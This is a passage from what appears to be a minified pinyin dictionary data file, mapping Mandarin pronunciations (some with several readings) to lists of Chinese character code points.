lie\":[21671],\"zī\":[21672,21982,22997,23039,23388,23411,23414,23856,23915,26661,26900,28100,28285,28363,28588,29574,31116,31222,31906,32014,32199,32213,32387,32513,33546,33586,33880,35566,35864,36018,36039,36160,36164,36220,36241,36262,36636,36666,36750,37137,37421,37657,37759,37793,38193,38211,38974,38975,39661,39892,39974,40123,40325,40722,40781,40796,40839],\"mī\":[21674],\"jī xī qià\":[21677],\"gē luò kǎ lo\":[21679],\"shù xún\":[21680],\"zán zá zǎ zan\":[21681],\"hāi ké\":[21683],\"huī\":[21684,22085,22101,23118,23176,24145,24509,24674,25339,25381,25582,26198,26249,26958,27907,28680,28784,28787,28899,30579,31112,32730,32748,34355,34950,35096,35452,35801,35927,36637,36745,39988,40638],\"huài shì\":[21686],\"táo\":[21687,21845,26691,27310,27950,28120,31097,32175,32505,33796,34602,35050,36847,36867,37252,37630,38784,38793,39232,39395,39434,40727],\"xián\":[21688,21859,23092,23097,23153,23244,23290,23291,24358,25382,25743,28046,28282,28566,29961,30187,30279,30286,32067,32984,33335,34262,34495,34525,34900,34904,35512,35572,36066,36114,36132,36657,37262,37532,37990,38289,38386,40435,40436,40444,40519,40569,40601],\"è àn\":[21689],\"xuān xuǎn\":[21690,28892],\"wāi hé wǒ guǎ guō\":[21692],\"yàn yè yān\":[21693],\"āi\":[21696,21710,22467,28350,37552,37764,38207],\"pǐn\":[21697,27008],\"shěn\":[21698,23158,23352,23457,23479,23529,24350,26315,28182,28683,30635,30692,30695,35262,35360,35543,35717,35842,35849,37029,38947,39787],\"hǒng hōng hòng\":[21700],\"wā wa\":[21703],\"hā hǎ hà\":[21704],\"zāi\":[21705,26685,28221,28328,28797,28798,28886,30581,36083],\"dì diè\":[21707],\"pài\":[21708,27808,27966,28178,28227,33934,37763],\"gén hěn\":[21711],\"yǎ yā\":[21713,38597],\"yuě huì\":[21717,22118],\"nián\":[21718,24180,31178,31205,39822,39920,40071,40118,40263,40655],\"huá huā\":[21719,22057],\"jì jiē zhāi\":[21724,22156],\"mōu\":[21726],\"yō yo\":[21727,21938],\"lòng\":[21730,26759,36122],\"ò ó é\":[21734],\"lī lǐ li\":[21737],\"nǎ na nǎi né něi\":[21738],\"hè\":[21740,22414,22737,23497,24786,28931,28994,29178,29184,30283,30859,32751,35088,35614,36032,36154,36203,38733,38734,38735,40372,40470,40548],\"bō pò bā\":[21745],\"zhé\":[21746,21856,21894,22174,22481,24714,25722,26210,26211,27517,30714,30739,30932,31863,31885,34420,34544,34756,34985,35423,35627,35642,35713,35723,35882,36626,36633,36685,36740,36761,39871],\"liàng láng\":[21748],\"liè lǜ\":[21751],\"hān\":[21755,25e3,34486,35901,37219,38919,39032,39328,39805,40766],\"hēng hng\":[21756],\"gěng\":[21757,22466,23802,25389,26775,32134,32480,32831,33668,37088,39614,39873,40096],\"chuò yuè\":[21758],\"gě jiā\":[21759],\"bei bài\":[21764],\"hán hàn\":[21765],\"chún\":[21767,28017,28283,28387,28440,29321,32020,32431,33059,33724,33939,34036,37255,37269,37662,38489,39897,40329,40529],\"ài āi\":[21769],\"jiá qiǎn\":[21770],\"yán dàn xián\":[21772],\"chē\":[21779,30743,30824,33687,34556],\"wú ńg ń\":[21780],\"zào\":[21781,21795,22122,24933,26765,28790,29040,29157,30337,30338,31427,31432,31753,33345,35679,36270,36481,36896],\"dí\":[21785,21831,22016,22145,23265,24312,25932,25973,26769,28068,28364,29380,31515,31860,31988,33494,33659,34059,34064,34273,35263,35276,35956,36842,38766,38932,39344,39650,40464],\"gòng hǒng gǒng\":[21789,21962],\"dóu\":[21790],\"lào láo\":[21792,22062,24998],\"liǎng yīngliǎng\":[21793],\"huàn\":[21796,21914,22850,22864,23462,23880,24187,24739,24844,25442,25563,25808,25868,26777,27125,28003,28067,28185,28470,28579,28873,28949,29029,29773,30186,30227,30534,32914,34279,35938,36696,36909,39879,39926,39936,40105],\"léng\":[21797,22596,26974,30864,34192],\"wō wěi\":[21801],\"fěng\":[21802,35202,35575,35773],\"yín jìn\":[21803],\"hǔ xià\":[21804],\"wéi\":[21807,22260,22285,22749,23767,23774,23916,24079,24119,24131,24799,26693,27817,27912,28064,28235,28296,28493,28505,28543,28656,29353,30656,32173,32500,34038,35257,36829,36949,37164,37248,37711,38344,38385,38859,38886,39840],\"shuā\":[21808],\"chàng\":[21809,24581,24757,26274,28987,30021,30076,35503,38868,39727],\"ér wā\":[21810],\"qiàng\":[21812,28829,29079,32699],\"yō\":[21815],\"yū\":[21817,28132,30208,30419,31626,32006,32417,36796,36802,36803,38483],\"lài\":[21819,28625,28712,28716,30302,30313,30544,30558,31809,31839,34302,36058,36084,36169,36182,38972,38978,40291],\"tuò\":[21822,23966,26589,27620,27643,31656,31836,33818,34304,36293],\"zhōu zhāo tiào\":[21825],\"kěn\":[21827,22438,22718,24691,25031,32910,32943,32955,35940,37689],\"zhuó zhào\":[21829,28655],\"hēng hèng\":[21832,24729],\"lín lán\":[21833],\"a ā á ǎ à\":[21834],\"qiāng\":[21836,22004,23944,25109,25700,26024,26538,27085,28332,29252,29456,29511,32652,32663,33108,34595,35602,37848,38166,38197],\"tūn zhūn xiāng duǐ\":[21837],\"wèn\":[21839,22927,25598,25653,29882,38382,38992],\"cuì qi\":[21840],\"dié shà jié tì\":[21841],\"yuē wā\":[21848],\"zǐ cǐ\":[21849],\"bǐ tú\":[21850],\"chuò chuài\":[21852],\"yǎ yā è\":[21854],\"fēi\":[21857,23123,23124,25161,26243,28164,29446,32203,32495,35062,38671,38750,38751,39131,39133,39134,39205,39329,39441,39451,39905,40113],\"pí\":[21860,22720,26503,27607,27608,28983,29749,30130,30382,31738,32628,32646,33086,33111,33165,34445,34493,34609,34743,34863,35964,35988,37099,37433,38448,38516,38566,39790,39821,40079,40295,40729],\"shá\":[21861],\"lā la\":[21862],\"yīng qíng\":[21864],\"pā\":[21866,22929,33317,33897,36276],\"zhě shì\":[21867],\"sè\":[21868,21959,25038,25804,26652,27502,28073,28171,28544,28545,28615,28623,28690,29791,29873,30263,31313,31329,31343,32364,35653,36694,37547,37884,38127,39115],\"niè\":[21870,21995,22107,22169,22209,22227,22332,23420,23421,23922,23981,24021,24071,25948,26559,27127,27377,28037,28284,30150,31710,31819,31985,31989,32834,32886,33260,33266,34326,34853,35736,36354,36375,36377,36433,36513,37660,37811,37960,38007,38016,38218,38221,38353,38503,38537,39027,39070,40807],\"luō luó luo\":[21872,22217],\"tān chǎn tuō\":[21876],bo:[21877,34068],\"dìng\":[21878,23450,26903,30708,30855,30880,30968,32866,33114,33827,35330,35746,37664,38189,38977,39139,39268],\"lāng\":[21879],\"án ān\":[21885],\"kā\":[21888,25814],\"yóng yú\":[21889],\"lā lá lǎ\":[21895],\"jiē\":[21896,21948,21983,22566,23192,25509,25522,25809,28253,29039,30102,30158,30308,30342,31224,31277,33083,34644,34903,35631,38454,38542,38786,40347],\"hóu\":[21897,24127,29492,30218,30586,31692,31943,32749,33876,37127,37741,39217,39610,39928],\"dié zhá\":[21899],\"wāi\":[21902,27498,31477],\"nuò rě\":[21903],\"xù huò guó\":[21904],\"zán\":[21906],\"wō ō\":[21908],\"hú\":[21910,22045,22251,22774,22775,22778,23209,24359,25648,26011,26972,27122,28246,28715,28928,29043,29392,29474,29786,29939,31670,32087,32288,32993,33899,34075,34676,34716,34906,35315,37264,37752,38966,39212,39693,39793,39959,40288,40344,40358,40533],\"huàn yuán xuǎn hé\":[21915],\"xǐ\":[21916,22221,22736,23651,24473,24985,26546,27250,27478,28423,29626,29885,30678,31143,32304,33864,33912,34032,34786,35601,36445,36519,37410,37480,37481,40026],\"hē hè yè\":[21917],\"kuì\":[21919,22067,23231,23303,24870,24871,24978,31697,31779,31812,32873,32877,32885,33197,34146,35593,39229,39243,39304],\"zhǒng chuáng\":[21920],\"wéi wèi\":[21921,28858,29234],\"duó zhà\":[21925],\"sāng sàng\":[21930],\"qiáo jiāo\":[21932],\"pèn bēn\":[21935],\"cān sūn qī\":[21936],\"zhā chā\":[21939],\"miāo\":[21941],\"pēn pèn\":[21943],\"kuí\":[21945,22804,22862,24025,25123,25542,26182,26252,26959,26961,27334,29354,30589,33909,34248,34359,34369,34672,36520,36917,37128,37736,37751,38959,39319,39460,39577,39745],\"lou lóu\":[21949],\"zào qiāo\":[21951],\"hè xiāo xiào hù\":[21955],\"á shà\":[21956],\"xiù\":[21957,23723,23744,28340,29659,29703,29843,31168,32137,32333,32353,32483,34705,34966,35086,35087,37561,37861,37885,38152,40773],\"qiāng qiàng\":[21958,25111,25127,36428,36449],\"ài yì\":[21964,33406],\"má mǎ ma\":[21966],\"kè kē\":[21969],\"dā tà\":[21970,37769],\"sǎng\":[21971,25633,30921,35116,37791,39001,39073],\"chēn\":[21972,25275,29723,30603,35523,35603,36061,37108],\"wā gǔ\":[21975],\"pǎng bēng\":[21977],\"xián qiǎn qiān\":[21979],\"lào\":[21984,23274,27247,28061,28551,32802,32814,36540,36546,37226],\"wēng\":[21985,32705,32876,34697,37779,40370,40543],\"wà\":[21986,33149,33155,34972,35178,38884],\"hēi hāi\":[21992],\"hē\":[21996,27441,34842,35382,35779],zi:[21997],\"sǎi\":[21998],\"ǹg ńg ňg\":[21999],\"gě\":[22e3,33336],\"ná\":[22001,25295,25343,37823,38222],\"diǎ\":[22002],\"ài ǎi āi\":[22003],\"tōng\":[22005,27147,28853,34026],\"zuī suī\":[22010],\"zhē zhè zhù zhe\":[22011],\"mò\":[22012,22333,22651,22696,22970,23292,23518,24094,26153,26411,26554,27519,27521,27819,28448,29189,29519,30268,30348,30525,30527,30608,30617,30750,31027,31203,32072,32390,32817,33545,33672,34022,34536,34772,35971,35978,35992,37510,37836,38214,38476,38778,39488,39785,40664,40665],\"sòu\":[22013,30262],\"tǎn\":[22015,22374,24528,25011,25019,26298,27631,29870,33788,34962,35170,37267,37485,38077],\"jiào dǎo\":[22020],\"kǎi gě\":[22021],\"shān càn\":[22023],\"cáo\":[22024,23942,26361,26362,27133,28437,33370,34040,34732,35135,37866],\"piào\":[22028,24497,34056,39491],\"lóu lou\":[22029],\"gǎ\":[22030,23573,29581],\"gǔ jiǎ\":[22031],\"jiāo xiāo\":[22032],\"xū shī\":[22040,22099],\"pó\":[22041,22185,23110,27335,30372,37169],\"dē dēi\":[22042],\"ma má\":[22043],\"lē lei\":[22046],\"gā gá gǎ\":[22048],\"sāi\":[22053,22139,27618,33134,38987,39955],\"zuō chuài\":[22060],\"cháo zhāo\":[22066,26397,40706],\"zuǐ\":[22068,22143,23946,29883],\"fǔ ḿ\":[22072],\"qiáo qiào\":[22074,32761,35887],\"chù xù shòu\":[22076],\"tān chǎn\":[22077],\"dàn tán\":[22078,24382,24392,24788,28601],\"hēi mò\":[22079],\"ě\":[22081,30760,38923,39424,40264],\"fān bo\":[22083],\"chuáng\":[22087,24202,29248],\"cù zā hé\":[22088],\"tūn kuò\":[22091],\"cēng chēng\":[22092],\"dēng\":[22100,23297,28783,29128,29842,30331,31475,31782,33376,35915],\"pū\":[22103,25169,25778,25908,25909,28541,28807,38496],\"juē\":[22104,23657,23659,25767],\"lū\":[22108,22165,25784,25852,35618],\"zhān\":[22113,23742,24777,26051,26076,26540,26676,27617,27656,27658,27838,30651,34205,34501,35392,35449,35691,35893,36232,36997,38298,38673,39142,39256,39513,39769,40035,40455,40559],\"ō\":[22114],\"zhòu zhuó\":[22115],\"jiào qiào chī\":[22125],\"yuàn\":[22126,22964,24616,24895,25534,29783,31120,33489,34895,35051,35089,38498,39e3],\"ǎi ài āi\":[22127],\"yōng yǒng\":[22128,28589],\"jué xué\":[22129],\"pēn pèn fèn\":[22132],\"gá\":[22134,23580,37331,37687,38022],\"hm hěn xīn hèn\":[22135],\"dāng\":[22137,28578,29680,29867,31580,31801,33377,34807,35014,35168],\"làn\":[22146,28389,28651,28866,29143,29185,29211,29220,29907,31991,38020],\"tà\":[22147,22202,23817,25374,25640,25787,27067,27261,27646,28094,28606,28620,31138,31887,35515,35702,36427,36473,36482,36514,36957,37652,38354,38373,38396,38424,38812,38835],\"huō huò ǒ\":[22148],\"hāo\":[22150,33568,33983,34181],\"hè xià\":[22151],\"xiù pì\":[22154],\"zhōu chóu\":[22155,30441,35818],\"mē\":[22162],\"chā cā\":[22163],\"bó pào bào\":[22167],\"me mèi mò\":[22172],\"xié hái\":[22177],\"áo xiāo\":[22179],\"mō\":[22180,25720],\"pín\":[22188,23078,23252,23338,29613,30665,34226,34841,36007,36139,39024,39078],\"mè\":[22192,28665],\"rǎng rāng\":[22199],\"lá\":[22201,26095],\"jiáo jué jiào\":[22204],\"chuò\":[22205,23062,25801,27488,28080,30957,36352,36639,36749,36789,36790,37227,37985,39199,40810,40842],\"huān huàn\":[22206],\"zá cà\":[22211],\"chài\":[22214,34431,34822,34947,35341],\"náng nāng\":[22218],\"zá zàn cān\":[22219],\"sū\":[22220,27375,29990,31267,31308,31395,34311,34323,37221,39874],\"zèng\":[22222,29111,29969,36104,36192,37605,38147],\"zá niè yàn\":[22224],\"nāng\":[22228],\"luó luō luo\":[22230],\"wéi guó\":[22231],\"huí\":[22232,22238,22252,24315,24317,24667,27908,30160,33588,34456,34516,34517,34582,36852,36901,39856],\"nín\":[22236,24744,33036],\"jiǎn nān\":[22237],\"nān\":[22241],\"tuán\":[22242,22243,22296,24945,25247,25718,27314,31984,37828,40402,40443],\"tún dùn\":[22244,22345],\"guó\":[22255,22262,22267,22269,22272,22283,24124,24151,24918,25681,28429,32861,33112,33173,34094,34402,39320],\"kùn\":[22256,28035,30543],\"wéi tōng\":[22258],\"qūn\":[22263,22795,36897],\"rì\":[22264,26085,34933,37412,39353,39538],\"tāi\":[22268,23393,32974],\"pǔ\":[22275,22289,25800,26222,26268,27192,27279,27654,28006,28325,28915,35561,35676,35889,36476,37920,38248],\"quān juàn juān\":[22280,22287],\"chuí chuán\":[22284],\"tuǎn\":[22293,30077,30083],\"lüè\":[22297,25504,30053,30055,31268,37597,37602,38154],\"huán yuán\":[22300],\"luán\":[22301,22302,22897,23048,23372,23402,23423,23782,24018,25371,25891,26347,26686,27410,28390,28772,30324,30325,32649,33044,33248,34378,37550,38014,40265,40478,40510],\"tǔ\":[22303,22305,37367,38029],\"xū wéi\":[22313],\"dì de\":[22320,23987],\"qiān sú\":[22321],\"zhèn\":[22323,22630,25355,25391,26389,26650,30013,30521,32022,32124,32444,35499,36049,36168,37620,37805,37806,38215,38453,38499,38663,40198,40489],\"chǎng cháng\":[22330,22580,22642],\"qí yín\":[22331],\"jiá\":[22335,24550,24669,25118,25204,33061,33626,33698,34545,34554,35020,36338,37071,37087,37583,38103,38956,38960,39050,40246,40266],\"zhǐ zhì\":[22337],\"bǎn\":[22338,23685,26116,26495,29256,29930,31876,33320,34626,37393,38051,38442,39788],\"qǐn\":[22341,23505,23517,23522,26129,26795,31497,34748,36222,37599,38163],\"méi fén\":[22342],\"rǒng kēng\":[22344],\"fāng fáng\":[22346],\"fèn bèn\":[22347],\"tān\":[22349,24633,25674,25849,25892,28393,28760,30251,30321,33297,36010,36138],\"huài pēi pī péi\":[22351],\"dì làn\":[22356],\"tán\":[22363,22704,22709,22727,22748,23122,24987,26137,26311,27011,27264,28525,29122,30192,30969,32584,32590,34283,35527,35674,35680,35848,35885,35994,37103,37296,37663,38979],\"bà\":[22365,22459,22761,24349,27419,28766,29240,30706,35207,38712,39809,40069],\"fén\":[22367,22707,22946,23694,24169,26508,26876,27774,28954,29132,29139,32658,32693,33974,34145,34464,34465,35950,35958,36690,37948,38571,39337,39797,40642,40726,40738],\"zhuì\":[22368,22684,24820,29952,30071,30984,32180,32267,32512,32530,33103,33159,35528,36101,36184,37258,37667,37958],\"pō\":[22369,23717,27900,28300,28497,37337,37882,38027,38935,39047],\"pǎn bàn\":[22370],\"kūn\":[22372,22531,22546,23824,23825,26118,26204,28489,28956,29108,29457,29736,29819,33742,34603,35016,35049,35084,37260,37653,38175,39433,39648,39649,39656,39908,40114,40318,40356,40525],\"diàn\":[22379,22443,22666,22722,22880,23133,24215,24806,25154,27202,27583,28096,28593,29623,29716,30005,30300,31775,34580,37439,38651,38747,39508],\"mù mǔ\":[22390],\"kē kě\":[22391,36603],\"xuè\":[22393,23716,26710,28709,29400,30642,35604,35857,36240],\"dǐ chí\":[22395,26594],\"lā\":[22403,26566,33736,37003],\"lǒng\":[22404,22405,22751,22752,25314,25871,31433,38471,38580],\"mín\":[22410,22980,23735,23823,25450,26107,26108,27665,29641,29720,29725,29769,30203,30463,30727,32205,32225,32535,32608,33504,37425,37641,37746,40214],\"dòng tóng\":[22412,23762,27934],\"cí\":[22416,23336,24904,26572,28648,29633,29943,29958,30913,31008,31072,31949,33576,35422,35789,36765,36766,36772,36781,38604,39162,39176,40220,40383,40384,40538],\"duī\":[22422,22534,22624,30205,30931,37907,37916,40237],\"duò duǒ\":[22427],\"duǒ duò\":[22428,25350],\"chá\":[22430,23519,23894,25661,27086,27307,29497,33580,33590,35431,38763],\"shǎng\":[22439,26188,27145,36062,36120,36175,37631,37851,37980],\"shǒu\":[22440,23432,25163,25164,33359,39318],da:[22447,32360,36342],\"háng\":[22451,26043,26477,31573,32078,32471,33322,33472,34466,35012,36005,36818,38927,39043,39783],\"ān ǎn\":[22453],\"xīng\":[22454,24826,26143,26320,29003,29481,29766,30376,31682,33125,33288,35306,35314,35587,39426,39565,39823,39929],\"yuàn huán\":[22456],\"bāng\":[22457,24110,24135,24154,24171,25440,26758,27996,37030,37035,38820],\"póu fú\":[22458],\"cén\":[22465,23697,28052],\"běng fēng\":[22468],\"dì fáng\":[22469],\"xiá jiā\":[22473],\"mái mán\":[22475],\"làng\":[22476,23808,28010,33943,38316],\"shān yán\":[22479],\"qín jīn\":[22480],\"pǔ bù\":[22484],\"huā\":[22486,23154,26907,30836,31936,33457,33930,34340,35502,37685],\"suì sù\":[22499],\"pí pì\":[22500],\"qīng zhēng\":[22501,40109],\"wǎn wān\":[22502],\"lǔn\":[22504,31248],\"zhēng chéng\":[22505],\"kōng\":[22506,23814,31644,36539,37651,40316],\"cǎi cài\":[22512,23488,37319],\"chù tòu\":[22513],\"běng\":[22514,29739,33782,38811],\"kǎn xiàn\":[22515],\"yì shì\":[22518,37299],\"péi\":[22521,27632,35060,35061,36064,36180,37639,38187,38443,38506],\"sào sǎo\":[22525],\"jǐn qīn jìn\":[22535],\"péng bèng\":[22539],\"qiàn zàn jiàn\":[22545],\"àn\":[22547,23669,23736,25353,26263,26696,33018,33612,35963,35979,37644,38343,38540,40687],\"duò huī\":[22549,22702],\"huán\":[22554,23503,23536,23768,26707,27961,28596,29506,29615,29872,31979,32367,32563,32678,33601,33800,33809,35954,37744,37942,38206,38254,38372,38427,38600,39711,40558],\"bǎo bǔ pù\":[22561],\"máo móu wǔ\":[22565],\"ruán\":[22567,22742,25739],\"ài è yè\":[22568],\"gèng\":[22569,26245],\"méi\":[22579,22650,23186,23883,24510,25879,26522,26626,26757,26979,26995,27089,28228,28232,29028,29496,29611,29691,29762,30473,30530,31126,33028,33058,33116,33530,33683,33919,37119,37238,37767,38213,38665,40357,40539,40692],\"dǔ\":[22581,29757,30585,31491,31716,35241,36077,36172],\"féng\":[22584,32152,33346,36898],\"hèng\":[22588],\"chūn\":[22590,23179,26110,26149,26265,26486,26943,27078,27201,27332,29763,31674,33797,34685,36660,39942,40350],\"jiǎng\":[22594,22870,22888,22892,26728,27123,29518,32809,33177,33931,34083,35611,35762,39004],\"huāng\":[22595,24031,24908,32915,33618,34881],\"duàn\":[22597,26029,26039,26932,27573,27592,28997,29782,30891,31766,31850,32222,32526,33142,33902,36502,37723,38203],\"tǎ\":[22612,22678,29549,29562,39833,39976,40142],\"wěng\":[22613,22883,23905,25882,26273,30600,33994],\"sāi sài sè\":[22622],\"zàng\":[22623,24329,33235,33247,33900,34101,37562],\"tián\":[22625,23623,24684,27834,28233,29875,29979,29980,3e4,30027,30033,30901,30924,32971,38352,38423,40235,40390,40399],\"zhèng\":[22627,24129,25919,35388,35533,35657,35777,35812,37073,37165,38741,40202],\"tián zhèn\":[22635],\"wēn\":[22637,26167,27058,27551,28201,28331,29797,30239,34160,35953,36668,36672,36754,37822,39234,39963,39982,40129],\"liù\":[22639,24263,30943,32719,38625,38692,39230,39736,40410,40552],\"hǎi\":[22640,28023,28920,37244,37282],\"lǎng\":[22641,26390,26391,26404,28922,34018],\"bèng\":[22644,25596,27893,29967,32179,36454,36856,36908,37872,38234],\"chén\":[22645,23480,23576,24561,25936,25974,26216,26335,26645,27140,27785,28993,30222,33251,33566,33664,33680,34095,34236,34740,35366,35574,36569,36784,36839,37378,38472,38515,38659,40400,40590],\"ōu qiū\":[22648],\"qiàn jiàn\":[22649],\"zhuān tuán\":[22652],\"shuǎng\":[22653,24929,28474,29245,32276,37871],\"shú\":[22654,23116,23408,29881,31211,36118,36174],\"lǒu\":[22655,23901,23937,29962,31699,31757],\"chí\":[22656,24347,25345,27744,28454,31486,31554,31630,31722,33548,33614,34483,35608,36030,36223,36383,36831,36833,36933,36959,36978,37705,39347,39536],\"shù\":[22661,24246,24251,24631,24661,25101,26463,26641,27193,27821,28465,28484,28630,31446,31466,32073,33127,33623,33921,34410,34899,35019,35918,36848,37477,37680,37859,38676,40336],\"dì zhì\":[22662,30096],\"kàn\":[22664,23809,30640,30681,30945,34894,39723],\"chěn\":[22667,22822,30838,30876,30947,36098,36283,36408,37718],\"zhǐ zhuó\":[22668],\"qiǎng\":[22671,32328,32358,32677,35137],\"zēng\":[22679,22686,24974,29844,30704,30963,32638,35652,37163,40027],\"qiáng\":[22681,22715,23281,23321,27183,27299,28434,29254,33378,34051,34103,34336],\"kuài tuí\":[22692],\"tuǎn dǒng\":[22693],\"qiáo què\":[22695],\"zūn dūn\":[22699],\"qiāo áo\":[22717],\"yì tú\":[22719],\"xué bó jué\":[22726],\"lǎn\":[22728,23358,23364,23375,25042,25078,25597,25829,25900,27012,27414,28008,28452,28768,32412,32518,32625,35239,35261,35272,37250,39026],\"huài\":[22730,22750,34366],\"rǎng\":[22732,22756,25880,29209],\"làn xiàn\":[22735],\"dǎo\":[22740,23548,23566,23707,23798,23947,23948,23993,25443,25623,25827,27101,31095,31106,31153,36424,38502,38557,38575],\"ruǐ\":[22753,26741,27236,32352,34122,34123,34306,34307],san:[22765],\"zhuàng\":[22766,22767,22773,25758,28939,29366,29376],\"ké qiào\":[22771,27580],\"kǔn\":[22776,22780,24707,25414,26801,30833,31093,31239,31259,32145,35021,38315,38328,38403],\"mǎng\":[22782,28461,33595,33725,33726,34830],\"cún\":[22783,23384],\"zhǐ zhōng\":[22786],\"gǔ yíng\":[22787],\"jiàng xiáng\":[22789,38477],\"páng féng fēng\":[22790],\"zhāi\":[22792,25434,25688,25995,25998,27064,31874,40779],\"xuàn xiòng\":[22800],\"wài\":[22806,39009],\"wǎn yuàn wān yuān\":[22807],\"mǎo wǎn\":[22808],\"mèng\":[22818,22819,23391,26790,30310,38693],\"dà dài\":[22823],\"fū fú\":[22827,22983,26510,31920],\"guài\":[22828,24618,24672],\"yāng\":[22830,22990,25264,27523,27889,31207,32998,37472,37704,38645,40230,40495],\"hāng bèn\":[22831],\"gǎo\":[22832,25630,26482,27072,27073,27322,31233,31294,31295,32286,32543,33746,34241,34291],\"tāo běn\":[22834],\"tóu tou\":[22836],\"yǎn tāo\":[22837],\"kuā kuà\":[22840,35463],\"jiá jiā gā xiá\":[22841],\"huà\":[22843,23155,23295,23301,23819,25702,26489,26528,26726,27116,27194,28549,30011,30059,30069,32355,33305,35441,35545,35694,35805,40650],\"jiā jiá gā xiá\":[22846],\"ēn\":[22848,24681,33981],\"dī tì\":[22851],\"yǎn yān\":[22852,28208],\"pào\":[22853,30129,30384,30770,31007,31022,38756,40621],\"nài\":[22856,26608,28223,32784,33816,35110,37692,40720],\"quān juàn\":[22861,24366,26860],\"zòu\":[22863,25549],\"qì qiè xiè\":[22865],\"kāi\":[22866,24320,25577,37926,38158,38283],\"bēn bèn\":[22868,27853],\"tào\":[22871],\"zàng zhuǎng\":[22872],\"běn\":[22873,26412,26957,30042,32713,33519],\"xùn zhuì\":[22878],\"shē\":[22882,27304,29470,30061,30066,36050,36054,36170,36619],\"hǎ pò tǎi\":[22884],\"ào yù\":[22885,22887,28570],\"yūn\":[22891,27698,27699,33920,33941,34681,36103,36191],\"duǒ chě\":[22898],\"nǚ rǔ\":[22899],\"nú\":[22900,23397,31535,39377,39549],\"dīng dǐng tiǎn\":[22901],\"tā jiě\":[22905],\"nuán\":[22907],\"hǎo hào\":[22909],\"fàn\":[22911,23310,26805,27726,27867,28412,28714,29359,30024,30421,31541,31684,33539,35337,36009,36137,36588,36669,39151,39152,39277],\"shuò\":[22913,25632,26388,27082,28865,29197,30687,33972,37785,37984,38084],\"fēi pèi\":[22915],\"wàng\":[22916,24536,26106,26395,26402],\"zhuāng\":[22918,22941,23076,24196,24210,26729,26761,27137,31911,31962,33624,33674,35013,35037],\"mā\":[22920,23229],\"fū yōu\":[22923],\"hài jiè\":[22926],\"dù\":[22930,22956,26460,27564,28193,31226,33423,33648,34713,34855,34873,37709,38208,38767],\"miào\":[22937,24217,24255,24287,29573,31447],\"fǒu pēi pī\":[22938],\"yuè jué\":[22940],\"niū\":[22942],\"nà nàn\":[22944],\"tuǒ\":[22949,23287,24249,26925,26965,27234,39692,39958,40270],\"wàn yuán\":[22951],\"fáng\":[22952,25151,32938,38450,39796,40066],\"nī\":[22958],\"zhóu\":[22959,30881],\"zhāo\":[22961,24054,25307,26157,37335,37450,37731,38026,39371],\"nǎi nǐ\":[22963],\"tǒu\":[22965,25960,32015,34339,40648],\"xián xuán xù\":[22966],\"zhí yì\":[22967,31175],\"ē\":[22968,22975,23104,23641],\"mèi\":[22969,23194,23504,25274,26048,26151,27820,29021,30167,30491,30584,31065,31683,34654,34946,36298,39741,39749],\"qī qì\":[22971],\"xū xǔ\":[22977,31280],\"shān shàn\":[22989,22999,33515,37348,38032],\"mán\":[22991,24946,27168,34542,34875,35646,39237,39314,39703,39704,39995,40151],\"jiě\":[22992,23182,27294,27601,39159],\"wěi wēi\":[22996],\"pīn\":[23e3,25340,30999,31334,39338,39518],\"huá huó\":[23009],\"jiāo xiáo\":[23011],\"gòu dù\":[23012],\"lǎo mǔ\":[23013],\"nián niàn\":[23017],\"zhěn\":[23019,23634,24363,25262,26147,26517,30043,30137,30485,31289,32285,32293,32540,32836,33817,34967,35030,35225,35386,35786,36587,36728,36788,39383,39698],\"héng\":[23022,24646,24658,28870,29673,33019,34309,34913,37957,40244,40262,40507],\"jūn xún\":[23024],\"kuā hù\":[23025],\"è yà\":[23030],\"xiān shēn\":[23034],\"wá\":[23043],\"ráo rǎo\":[23046,23304],\"shào shāo\":[23051],\"xiē\":[23054,25587,26964,27463,34638,34829],\"wǔ méi mǔ\":[23058],\"chuò lài\":[23061],\"niáng\":[23064,23330,23363],\"nà nuó\":[23068],\"pōu bǐ\":[23069],\"něi suī\":[23070],\"tuì\":[23079,29050,34555,34581,36864,39422],\"mǎn\":[23080,23640,28288,28385,28415,34728,34766,35156,37835],\"wú wù yú\":[23082],\"xī āi\":[23085],\"zhuì shuì\":[23095],\"dōng dòng\":[23099],\"ǎi ái è\":[23102],\"ē ě\":[23103],\"mián\":[23106,23349,23424,26467,26825,27312,27339,30496,30664,30666,30671,32191,32220,32501,33415,34642],\"pǒu péi bù\":[23108],\"biǎo\":[23114,33087,34920,35057,35134,35544,37686],\"fù fàn\":[23119],\"wǒ\":[23120,23121,25105],\"ní nǐ\":[23127,26879],\"quán juàn\":[23128,24787],\"hūn\":[23130,26127,26156,26836,28093,30567,30575,30856,33636,33911,34066,36683,38333,38413],\"qiān jǐn\":[23132],\"wān wà\":[23136],\"lái lài\":[23137,24469,24480],\"zhōu chōu\":[23140],\"chuò nào\":[23141],\"nüè àn\":[23145],\"hùn kūn\":[23147],\"dàng yáng\":[23160],\"nàn\":[23163],\"ruò chuò\":[23164],\"jiǎ\":[23165,23724,26010,26013,27022,27098,27295,29630,30002,32987,37440,38078],\"tōu yú\":[23166,23214],\"yù yú\":[23168],\"wéi wěi\":[23169],\"dì tí\":[23170,29686,33488],\"róu\":[23171,25545,26580,28184,29027,29768,29895,31160,31880,31941,33052,33132,33863,34650,36418,36654,37714,38819,39461,39943,40340],\"ruǎn nèn\":[23174],\"miáo\":[23180,23289,25551,30596,33495,40339,40523],\"yí pèi\":[23184],\"mián miǎn\":[23188],\"tí shì\":[23198,24831],\"duò tuó\":[23200,27826],\"ǎo\":[23210,23228,33401,33466,34948,35158,38266],\"chú zòu\":[23216],\"yìng\":[23221,26144,26254,30828,33185,40038],\"qín shēn\":[23232],\"jià\":[23233,24143,26550,27042,31292,39381,39550],\"sǎo\":[23234],\"zhēn zhěn\":[23235],\"jiē suǒ\":[23237],\"míng mǐng\":[23239],\"niǎo\":[23243,23325,23346,33553,34086,34949,35018,35117,40479],\"tāo\":[23245,24141,24354,24902,25487,25647,27076,28059,28372,28644,29803,32091,32282,32295,32486,35420,35615,36673,38833,38876,38892,39160,39253],\"biáo\":[23249],\"piáo piāo\":[23254,34232],\"xuán\":[23257,24748,25080,26294,27272,28457,29572,29831,29887,30147,34561],\"màn mān\":[23258],\"kāng\":[23261,23931,24247,24951,27130,28462,30730,31301,31968,36543,37870,40007],\"hān nǎn\":[23272],\"nèn\":[23273,23280],\"zhē\":[23276,36974],\"mā má\":[23282],\"piè\":[23283],\"zhǎn\":[23288,23637,25612,26025,26028,29718,30415,30430,36670,37254,39085,39120],\"xiān yǎn jìn\":[23312],\"liǎn\":[23322,25947,25986,29711,29833,32695,33080,33225,34105,34333,34334,35043,35165,37179],\"qióng huán 